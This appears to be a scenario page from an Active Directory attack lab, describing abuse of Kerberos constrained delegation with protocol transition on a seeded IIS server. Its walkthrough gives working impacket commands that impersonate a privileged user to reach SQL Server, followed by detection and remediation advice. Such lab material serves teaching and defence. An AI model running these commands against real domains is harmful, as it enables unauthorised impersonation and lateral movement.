# Scenario 4 - Constrained Delegation / Protocol Transition

| | |
|---|---|
| **MITRE ATT&CK** | T1558 - Steal or Forge Kerberos Tickets; T1550.003 - Use Alternate Authentication Material: Pass the Ticket |
| **Toggle** | `misconfig.constrained_delegation` |
| **Role** | `misconfig_constrained_delegation` |
| **Host** | `SRV-IIS01` |
| **Foothold** | Local admin on `SRV-IIS01` |

## Objective

Abuse `S4U2Self` + `S4U2Proxy` on a host configured with protocol transition to
obtain a service ticket for a privileged user to a downstream service (SQL
Server), without knowing that user's password.

## Seeded configuration

- `SRV-IIS01$` has `TrustedToAuthForDelegation = $true` (protocol transition).
- `SRV-IIS01$` has `msDS-AllowedToDelegateTo` =
  `MSSQLSvc/SRV-SQL01.corp.contoso.lab:1433`.

Because protocol transition is enabled, `S4U2Self` can request a forwardable
ticket for *any* user to the host, then `S4U2Proxy` uses it to reach the
configured downstream SPN.

## Attack walkthrough

```bash
# 1. Foothold with local admin on SRV-IIS01 (certificate or service account).
# 2. Request S4U tickets for a privileged account (e.g. a Domain Admin or the
#    SQL service account) to the allowed downstream SPN.
impacket-getST -spn MSSQLSvc/SRV-SQL01.corp.contoso.lab:1433 \
  -impersonate aanderson \
  'corp.contoso.lab/SRV-IIS01$':'<machine-password>' \
  -dc-ip 10.10.10.10

# The result is a .ccache usable against SQL Server as the impersonated user.
export KRB5CCNAME=aanderson@MSSQLSvc_SRV-SQL01.corp.contoso.lab@CORP.CONTOSO.LAB.ccache
impacket-mssqlclient -k SRV-SQL01.corp.contoso.lab
```

### BloodHound view

`SRV-IIS01` shows outbound constrained delegation. The engine resolves the
`AllowedToDelegate` SPN to a host node and reports both
`Constrained delegation targets` and `Protocol transition delegation`.

## Detection

- **4769** with the service name of the downstream SPN and a different user in
  the ticket request, coming from the delegating host.
- Sysmon: `getST`/Rubeus on the foothold host.

## Remediation

- Disable protocol transition unless strictly required; prefer
  Kerberos-only delegation.
- Use resource-based constrained delegation with vetted, least-privilege
  principals.
- Never allow delegation from a web/app server to a Tier 0 or SQL service.
- Add privileged accounts to **Protected Users**.

## References

- MITRE T1558, T1550.003
- "Wagging the Dog: Abusing Resource-Based Constrained Delegation"
